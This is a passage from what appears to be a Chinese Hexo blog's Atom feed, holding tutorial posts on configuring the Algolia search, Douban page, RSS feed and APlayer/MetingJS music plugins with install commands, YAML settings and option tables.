<strong>在<code>_config.yml</code>文件中配置此插件：</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">algolia:</span><br><span class="line">  appId: &quot;Application ID 对应的值&quot;</span><br><span class="line">  apiKey: &quot;新建的 api key 对应的值&quot;</span><br><span class="line">  adminApiKey: &quot;***&quot;</span><br><span class="line">  chunkSize: 5000</span><br><span class="line">  indexName: &quot;my-blog&quot;</span><br><span class="line">  fields:</span><br><span class="line">    - content:strip:truncate,0,500</span><br><span class="line">    - excerpt:strip</span><br><span class="line">    - gallery</span><br><span class="line">    - permalink</span><br><span class="line">    - photos</span><br><span class="line">    - slug</span><br><span class="line">    - tags</span><br><span class="line">    - title</span><br><span class="line">    - about</span><br><span class="line">    - categories</span><br><span class="line">    - link</span><br><span class="line">    - movies</span><br><span class="line">    - music</span><br><span class="line">    - _posts</span><br><span class="line">    - messageboard</span><br></pre></td></tr></table></figure><table><thead><tr><th>键</th><th>类型</th><th>默认</th><th>描述</th></tr></thead><tbody><tr><td>appId</td><td>String</td><td></td><td>您的应用程序ID。可选，如果<code>ALGOLIA_APP_ID</code>设置了环境变量</td></tr><tr><td>apiKey</td><td>String</td><td></td><td>您的API密钥（只读）。用于搜索索引。可选，如果<code>ALGOLIA_API_KEY</code>设置了环境变量</td></tr><tr><td>adminApiKey</td><td>String</td><td></td><td>您的adminAPI密钥。它用于创建，删除，更新索引。可选，如果<code>ALGOLIA_ADMIN_API_KEY</code>设置了环境变量</td></tr><tr><td>chunkSize</td><td>Number</td><td>5000</td><td>记录/帖子被分成几块上传。建议使用Algolia以<code>5000</code>获得最佳性能。请注意，如果您要为帖子内容编制索引，则由于篇幅限制，它可能会失败。为了克服这个问题，请减小块的大小，直到通过为止。</td></tr><tr><td>indexName</td><td>String</td><td></td><td>存储帖子的索引名称。可选，如果<code>ALGOLIA_INDEX_NAME</code>设置了环境变量</td></tr><tr><td>fields</td><td>List</td><td></td><td>要索引的字段名称列表。用分隔字段名称和过滤器<code>:</code>。阅读<a href="https://github.com/LouisBarranqueiro/hexo-algoliasearch#filters" target="_blank" rel="noopener">过滤器</a>以获取更多信息</td></tr></tbody></table><h3 id="筛选器"><a href="#筛选器" class="headerlink" title="筛选器"></a>筛选器</h3><p>过滤器使您能够在建立索引之前处理字段的值。过滤器之间用冒号（<code>:</code>）隔开，并且可能具有以逗号（<code>,</code>）分隔的可选参数。可以链接多个过滤器。一个滤波器的输出将应用于下一个。</p><h3 id="过滤器列表："><a href="#过滤器列表：" class="headerlink" title="过滤器列表："></a>过滤器列表：</h3><table><thead><tr><th>过滤</th><th>签名</th><th>句法</th><th>描述</th></tr></thead><tbody><tr><td>跳闸</td><td><code>strip()</code></td><td><code>strip</code></td><td>删除HTML。对于摘录和内容值不索引HTML标签和属性可能很有用。</td></tr><tr><td>截短</td><td><code>truncate(start: number, end: number)</code></td><td><code>truncate,0,300</code></td><td>从<code>start</code>索引到<code>end</code>索引截断字符串。阿尔戈利亚（Algolia）在记录大小方面有一些限制，因此减少帖子内容可能很有用。</td></tr></tbody></table><h4 id="例"><a href="#例" class="headerlink" title="例"></a>例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fields:</span><br><span class="line">  - content:strip:truncate,0,200</span><br></pre></td></tr></table></figure><h3 id="选件"><a href="#选件" class="headerlink" title="选件"></a>选件</h3><table><thead><tr><th>选件</th><th>描述</th></tr></thead><tbody><tr><td>-n，-不清除</td><td>不清除现有索引</td></tr></tbody></table><h2 id="生成索引文件"><a href="#生成索引文件" class="headerlink" title="生成索引文件"></a>生成索引文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo algolia</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/categories/Hexo/"/>
    
      <category term="Algoliasearch" scheme="https://gz1903.github.io/categories/Hexo/Algoliasearch/"/>
    
      <category term="搜索" scheme="https://gz1903.github.io/categories/Hexo/Algoliasearch/%E6%90%9C%E7%B4%A2/"/>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/tags/Hexo/"/>
    
      <category term="Algoliasearch" scheme="https://gz1903.github.io/tags/Algoliasearch/"/>
    
      <category term="搜索" scheme="https://gz1903.github.io/tags/%E6%90%9C%E7%B4%A2/"/>
    
  </entry>
  
  <entry>
    <title>Hexo-Douban</title>
    <link href="https://gz1903.github.io/2019/10/19/Hexo-Douban/"/>
    <id>https://gz1903.github.io/2019/10/19/Hexo-Douban/</id>
    <published>2019-10-19T02:51:16.000Z</published>
    <updated>2019-10-28T03:42:51.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> <strong>Hexo-Douban —— 一个在 Hexo 页面中嵌入豆瓣个人主页的小插件，能够在Blog同步豆瓣个人主页信息。</strong></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-douban --save</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p> 将下面的配置写入站点的配置文件 <code>_config.yml</code> 里(不是主题的配置文件). </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#豆瓣插件</span><br><span class="line">douban:</span><br><span class="line">  user: 166226369</span><br><span class="line">  builtin: true</span><br><span class="line">  book:</span><br><span class="line">    title: &apos;那些年，看过的书&apos;</span><br><span class="line">    quote: &apos;过去、现在、未来&apos;</span><br><span class="line">  movie:</span><br><span class="line">    title: &apos;那些年，看过的电影&apos;</span><br><span class="line">    quote: &apos;过去、现在、未来&apos;</span><br><span class="line">  game:</span><br><span class="line">    title: &apos;那些年，玩过的游戏&apos;</span><br><span class="line">    quote: &apos;过去、现在、未来&apos;</span><br><span class="line">  timeout: 10000</span><br></pre></td></tr></table></figure><ul><li><strong>user</strong>: 你的豆瓣ID.打开豆瓣，登入账户，然后在右上角点击 “个人主页” ，这时候地址栏的URL大概是这样：”<a href="https://www.douban.com/people/xxxxxx/&quot;" target="_blank" rel="noopener">https://www.douban.com/people/xxxxxx/&quot;</a> ，其中的”xxxxxx”就是你的个人ID了。</li><li><strong>builtin</strong>: 是否将生成页面的功能嵌入<code>hexo s</code>和<code>hexo g</code>中，默认是<code>false</code>,另一可选项为<code>true</code>(1.x.x版本新增配置项)。</li><li><strong>title</strong>: 该页面的标题.</li><li><strong>quote</strong>: 写在页面开头的一段话,支持html语法.</li><li><strong>timeout</strong>: 爬取数据的超时时间，默认是 10000ms ,如果在使用时发现报了超时的错(ETIMEOUT)可以把这个数据设置的大一点。</li></ul><p>如果只想显示某一个页面(比如movie)，那就把其他的配置项注释掉即可。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="1-x-x版本"><a href="#1-x-x版本" class="headerlink" title="1.x.x版本"></a>1.x.x版本</h3><p>在0.x.x版本中，文章的更新和豆瓣页面的爬取操作是绑定在一起的，无法支持单独更新文章或者单独爬取文章。</p><p>在1.x.x版本中，使用<code>hexo douban</code>命令即可生成指定页面，如果不加参数，那么默认参数为<code>-bgm</code>。</p><p><strong>需要注意的是</strong>，通常大家都喜欢用<code>hexo d</code>来作为<code>hexo deploy</code>命令的简化，但是当安装了<code>hexo douban</code>之后，就不能用<code>hexo d</code>了，因为<code>hexo douban</code>跟<code>hexo deploy</code>的前缀都是<code>hexo d</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ hexo douban -h</span><br><span class="line">Usage: hexo douban</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">Generate pages from douban</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -b, --books   Generate douban books only</span><br><span class="line">  -g, --games   Generate douban games only</span><br><span class="line">  -m, --movies  Generate douban movies only</span><br></pre></td></tr></table></figure><p>如果配置了<code>builtin</code>参数为<code>true</code>，那么除了可以使用<code>hexo douban</code>命令之外，<code>hexo g</code>或<code>hexo s</code>也内嵌了生成页面的功能。</p><h3 id="0-x-x版本"><a href="#0-x-x版本" class="headerlink" title="0.x.x版本"></a>0.x.x版本</h3><p>直接使用命令<code>hexo g</code>即在生成静态页面前爬取豆瓣数据，如果使用<code>hexo s</code>则会监听文件变动，每有一次变动就会重新爬取数据。</p><h2 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h2><p>我会不定期更新一些功能或者修改一些Bug，所以如果想使用最新的特性，可以用下面的方法来更新:</p><ol><li>修改package.json内hexo-douban的版本号至最新</li><li>重新安装最新版本<code>npm install hexo-douban --save</code></li></ol><p>或者使用<code>npm install hexo-douban --update --save</code>直接更新。</p><h2 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h2><p>如果上面的配置和操作都没问题，就可以在生成站点之后打开 <code>//yourblog/books</code> 和 <code>//yourblog/movies</code>, <code>//yourblog/games</code>, 来查看结果.</p><h2 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h2><p>如果上面的显示没有问题就可以在主题的配置文件 <code>_config.yml</code> 里添加如下配置来为这些页面添加菜单链接.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  Home: /</span><br><span class="line">  Archives: /archives</span><br><span class="line">  Books: /books     #This is your books page</span><br><span class="line">  Movies: /movies   #This is your movies page</span><br><span class="line">  Games: /games   #This is your games page</span><br></pre></td></tr></table></figure><h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><h3 id="使用效果"><a href="#使用效果" class="headerlink" title="使用效果"></a><strong>使用效果</strong></h3><h4 id="movie"><a href="#movie" class="headerlink" title="movie"></a><a href="https://www.gz1903.club/movies/" target="_blank" rel="noopener">movie</a></h4><p><img alt data-src="https://ae01.alicdn.com/kf/Hdefc99cd6fbe40adbc7e7505c6225d718.png" class="lozad"></p><h4 id="book"><a href="#book" class="headerlink" title="book"></a><a href="https://www.gz1903.club/books/" target="_blank" rel="noopener">book</a></h4><p><img alt data-src="https://ae01.alicdn.com/kf/H7c70f37802ba48e39069eb8b93d33e3eq.png" class="lozad"></p><h4 id="game"><a href="#game" class="headerlink" title="game"></a><a href="https://www.gz1903.club/games/" target="_blank" rel="noopener">game</a></h4><p><img alt data-src="https://ae01.alicdn.com/kf/Hb7c2924d9db347c9bc1c819963dd2527r.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/categories/Hexo/"/>
    
      <category term="Douban" scheme="https://gz1903.github.io/categories/Hexo/Douban/"/>
    
      <category term="插件" scheme="https://gz1903.github.io/categories/Hexo/Douban/%E6%8F%92%E4%BB%B6/"/>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/tags/Hexo/"/>
    
      <category term="Douban" scheme="https://gz1903.github.io/tags/Douban/"/>
    
      <category term="插件" scheme="https://gz1903.github.io/tags/%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Hexo添加RSS订阅</title>
    <link href="https://gz1903.github.io/2019/10/19/Hexo%E6%B7%BB%E5%8A%A0RSS%E8%AE%A2%E9%98%85/"/>
    <id>https://gz1903.github.io/2019/10/19/Hexo添加RSS订阅/</id>
    <published>2019-10-19T02:13:39.000Z</published>
    <updated>2019-10-28T03:42:50.570Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="安装feed插件"><a href="#安装feed插件" class="headerlink" title="安装feed插件"></a>安装feed插件</h2><p> <strong>hexo博客有一个专门生成RSS xml文件的插件<code>hexo-generator-feed</code></strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-feed</span><br></pre></td></tr></table></figure><h2 id="启用插件"><a href="#启用插件" class="headerlink" title="启用插件"></a>启用插件</h2><p> 在博客工程文件根目录下<code>_config.yml</code>文件中添加如下内容 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line">plugins:</span><br><span class="line">    hexo-generator-feed</span><br><span class="line"><span class="comment">#Feed Atom</span></span><br><span class="line">feed:</span><br><span class="line">    <span class="built_in">type</span>: atom</span><br><span class="line">    path: atom.xml</span><br><span class="line">    <span class="built_in">limit</span>: 20</span><br></pre></td></tr></table></figure><h2 id="生成RSS"><a href="#生成RSS" class="headerlink" title="生成RSS"></a>生成RSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><h2 id="订阅"><a href="#订阅" class="headerlink" title="订阅"></a>订阅</h2><h3 id="新建订阅"><a href="#新建订阅" class="headerlink" title="新建订阅"></a>新建订阅</h3><p><strong>订阅地址为： <a href="https://www.gz1903.club/atom.xml" target="_blank" rel="noopener">https://www.gz1903.club/atom.xml</a> （PS：订阅地址改为自己的博客）</strong> </p><p><img alt data-src="https://ae01.alicdn.com/kf/H38f501d20bb84b28b20b6e65b3ca59c01.png" class="lozad"></p><h3 id="订阅成功"><a href="#订阅成功" class="headerlink" title="订阅成功"></a>订阅成功</h3><p><img alt data-src="https://ae01.alicdn.com/kf/H9b60545aaed54410847d9f4eb9e6d9a1l.png" class="lozad"></p><h3 id="查看邮箱中的博文"><a href="#查看邮箱中的博文" class="headerlink" title="查看邮箱中的博文"></a>查看邮箱中的博文</h3><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_250776376_1571451137290/0" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/categories/Hexo/"/>
    
      <category term="RSS" scheme="https://gz1903.github.io/categories/Hexo/RSS/"/>
    
      <category term="邮箱订阅" scheme="https://gz1903.github.io/categories/Hexo/RSS/%E9%82%AE%E7%AE%B1%E8%AE%A2%E9%98%85/"/>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/tags/Hexo/"/>
    
      <category term="RSS" scheme="https://gz1903.github.io/tags/RSS/"/>
    
      <category term="邮箱订阅" scheme="https://gz1903.github.io/tags/%E9%82%AE%E7%AE%B1%E8%AE%A2%E9%98%85/"/>
    
  </entry>
  
  <entry>
    <title>Hexo-Aplayer播放器</title>
    <link href="https://gz1903.github.io/2019/10/19/Hexo-Aplayer%E6%92%AD%E6%94%BE%E5%99%A8/"/>
    <id>https://gz1903.github.io/2019/10/19/Hexo-Aplayer播放器/</id>
    <published>2019-10-19T01:23:51.000Z</published>
    <updated>2019-10-28T03:42:51.683Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="创建歌单页面"><a href="#创建歌单页面" class="headerlink" title="创建歌单页面"></a>创建歌单页面</h2><p><strong>新建页面，命名为music：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page music</span><br></pre></td></tr></table></figure><p><strong>在 /Hexo/source 文件夹下会生成一个music文件夹，打开里面的index.md，修改：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 那些年，听过的音乐</span><br><span class="line">date: 2019-10-06 15:42:18</span><br><span class="line">type: &quot;music&quot;</span><br><span class="line">top_img: https://p.pstatp.com/origin/fe8c0000ded87ed2cd73</span><br><span class="line">comments: false</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p><strong>打开主题的 _config.yml文件，在menu下新建一个名为playlist的类（注意这里使用的图标是图标库中的<a href="http://www.fontawesome.com.cn/faicons/" target="_blank" rel="noopener">图标</a>。可以选择自己喜欢的图标，我这里选择的是music）。完成后如下所示：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  首页: / || fa fa-home</span><br><span class="line">  时间轴: /archives/ || fa fa-archive</span><br><span class="line">  标签: /tags/ || fa fa-tags</span><br><span class="line">  分类: /categories/ || fa fa-folder-open</span><br><span class="line">  清单||fa-fw fa fa-heartbeat:</span><br><span class="line">    - 音乐 || /music/ || fa fa-music</span><br><span class="line">    - 电影 || /movies/ || fa fa-film</span><br><span class="line">    - 书籍 || /books/ || fa fa-book</span><br><span class="line">    - Game || /games/ || fa fa-gamepad</span><br><span class="line">  友链: /link/ || fa fa-link</span><br><span class="line">  留言板: /messageboard/ || fa-fw fa fa-coffee</span><br><span class="line">  关于: /about/ || fa fa-heart</span><br></pre></td></tr></table></figure><h2 id="使用-hexo-tag-aplayer-插件"><a href="#使用-hexo-tag-aplayer-插件" class="headerlink" title="使用 hexo-tag-aplayer 插件"></a>使用 hexo-tag-aplayer 插件</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-tag-aplayer</span><br></pre></td></tr></table></figure><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><ul><li>APlayer.js &gt; 1.8.0</li><li>Meting.js &gt; 1.1.1</li></ul><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>最新版的 hexo-tag-aplayer 已经支持了MetingJS的使用，可以直接解析网络平台的歌曲，首先要在站点配置文件中开启meting模式，添加以下代码在配置文件的最后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aplayer:</span><br><span class="line">  meting: true</span><br></pre></td></tr></table></figure><p>复制歌单的链接，然后复制歌单的id，例如 <code>http://music.163.com/playlist/967120942/624741809/?userid=624741809</code>这个歌单的id就是967120942，公司名可以是tencent、netease或是其他公司，下面给出一个例子，打开source/music/index.md文件，输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% meting &quot;967120942&quot; &quot;netease&quot; &quot;playlist&quot; &quot;theme:#FF4081&quot; &quot;mode:circulation&quot; &quot;mutex:true&quot; &quot;listmaxheight:340px&quot; &quot;preload:auto&quot; %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a><a href="https://www.gz1903.club/music/" target="_blank" rel="noopener">演示</a></h3><p><img alt data-src="https://ae01.alicdn.com/kf/Hcdef1c4c28324e1c8a8f9a68478628c7z.png" class="lozad"></p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% aplayer title author url [picture_url, narrow, autoplay, width:xxx, lrc:xxx] %&#125;</span><br></pre></td></tr></table></figure><h3 id="标签参数"><a href="#标签参数" class="headerlink" title="标签参数"></a>标签参数</h3><ul><li><code>title</code> : 曲目标题</li><li><code>author</code>: 曲目作者</li><li><code>url</code>: 音乐文件 URL 地址</li><li><code>picture_url</code>: (可选) 音乐对应的图片地址</li><li><code>narrow</code>: （可选）播放器袖珍风格</li><li><code>autoplay</code>: (可选) 自动播放，移动端浏览器暂时不支持此功能</li><li><code>width:xxx</code>: (可选) 播放器宽度 (默认: 100%)</li><li><code>lrc:xxx</code>: （可选）歌词文件 URL 地址</li></ul><p>当开启 Hexo 的 <a href="https://hexo.io/zh-cn/docs/asset-folders.html#文章资源文件夹" target="_blank" rel="noopener">文章资源文件夹</a> 功能时，可以将图片、音乐文件、歌词文件放入与文章对应的资源文件夹中，然后直接引用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% aplayer &quot;Caffeine&quot; &quot;Jeff Williams&quot; &quot;caffeine.mp3&quot; &quot;picture.jpg&quot; &quot;lrc:caffeine.txt&quot; %&#125;</span><br></pre></td></tr></table></figure><h3 id="歌词标签"><a href="#歌词标签" class="headerlink" title="歌词标签"></a>歌词标签</h3><p>除了使用标签 <code>lrc</code> 选项来设定歌词，你也可以直接使用 <code>aplayerlrc</code> 标签来直接插入歌词文本在博客中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% aplayerlrc &quot;title&quot; &quot;author&quot; &quot;url&quot; &quot;autoplay&quot; %&#125;</span><br><span class="line">[00:00.00]lrc here</span><br><span class="line">&#123;% endaplayerlrc %&#125;</span><br></pre></td></tr></table></figure><h3 id="播放列表"><a href="#播放列表" class="headerlink" title="播放列表"></a>播放列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;% aplayerlist %&#125;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;narrow&quot;: false,                          // （可选）播放器袖珍风格</span><br><span class="line">    &quot;autoplay&quot;: true,                         // （可选) 自动播放，移动端浏览器暂时不支持此功能</span><br><span class="line">    &quot;mode&quot;: &quot;random&quot;,                         // （可选）曲目循环类型，有 &apos;random&apos;（随机播放）, &apos;single&apos; (单曲播放), &apos;circulation&apos; (循环播放), &apos;order&apos; (列表播放)， 默认：&apos;circulation&apos; </span><br><span class="line">    &quot;showlrc&quot;: 3,                             // （可选）歌词显示配置项，可选项有：1,2,3</span><br><span class="line">    &quot;mutex&quot;: true,                            // （可选）该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停</span><br><span class="line">    &quot;theme&quot;: &quot;#e6d0b2&quot;,                      // （可选）播放器风格色彩设置，默认：#b7daff</span><br><span class="line">    &quot;preload&quot;: &quot;metadata&quot;,                    // （可选）音乐文件预载入模式，可选项： &apos;none&apos; &apos;metadata&apos; &apos;auto&apos;, 默认: &apos;auto&apos;</span><br><span class="line">    &quot;listmaxheight&quot;: &quot;513px&quot;,                 // (可选) 该播放列表的最大长度</span><br><span class="line">    &quot;music&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;title&quot;: &quot;CoCo&quot;,</span><br><span class="line">            &quot;author&quot;: &quot;Jeff Williams&quot;,</span><br><span class="line">            &quot;url&quot;: &quot;caffeine.mp3&quot;,</span><br><span class="line">            &quot;pic&quot;: &quot;caffeine.jpeg&quot;,</span><br><span class="line">            &quot;lrc&quot;: &quot;caffeine.txt&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;title&quot;: &quot;アイロニ&quot;,</span><br><span class="line">            &quot;author&quot;: &quot;鹿乃&quot;,</span><br><span class="line">            &quot;url&quot;: &quot;irony.mp3&quot;,</span><br><span class="line">            &quot;pic&quot;: &quot;irony.jpg&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endaplayerlist %&#125;</span><br></pre></td></tr></table></figure><h3 id="MeingJS-支持-3-0-新功能"><a href="#MeingJS-支持-3-0-新功能" class="headerlink" title="MeingJS 支持 (3.0 新功能)"></a>MeingJS 支持 (3.0 新功能)</h3><p><a href="https://github.com/metowolf/MetingJS" target="_blank" rel="noopener">MetingJS</a> 是基于<a href="https://github.com/metowolf/Meting" target="_blank" rel="noopener">Meting API</a> 的 APlayer 衍生播放器，引入 MetingJS 后，播放器将支持对于 QQ音乐、网易云音乐、虾米、酷狗、百度等平台的音乐播放。</p><p>如果想在本插件中使用 MetingJS，请在 Hexo 配置文件 <code>_config.yml</code> 中设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aplayer:</span><br><span class="line">  meting: true</span><br></pre></td></tr></table></figure><p>接着就可以通过 <code>    <div id="aplayer-fxkgsWsp" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="..." data-server="undefined" data-type="undefined" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div></code> 在文章中使用 MetingJS 播放器了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 简单示例 (id, server, type)  --&gt;</span><br><span class="line">&#123;% meting &quot;60198&quot; &quot;netease&quot; &quot;playlist&quot; %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- 进阶示例 --&gt;</span><br><span class="line">&#123;% meting &quot;60198&quot; &quot;netease&quot; &quot;playlist&quot; &quot;autoplay&quot; &quot;mutex:false&quot; &quot;listmaxheight:340px&quot; &quot;preload:none&quot; &quot;theme:#ad7a86&quot;%&#125;</span><br></pre></td></tr></table></figure><p>有关 <code>    <div id="aplayer-vWUVETaw" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="undefined" data-server="undefined" data-type="undefined" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div></code> 的选项列表如下:</p><table><thead><tr><th>选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>id</td><td><strong>必须值</strong></td><td>歌曲 id / 播放列表 id / 相册 id / 搜索关键字</td></tr><tr><td>server</td><td><strong>必须值</strong></td><td>音乐平台: <code>netease</code>, <code>tencent</code>, <code>kugou</code>, <code>xiami</code>, <code>baidu</code></td></tr><tr><td>type</td><td><strong>必须值</strong></td><td><code>song</code>, <code>playlist</code>, <code>album</code>, <code>search</code>, 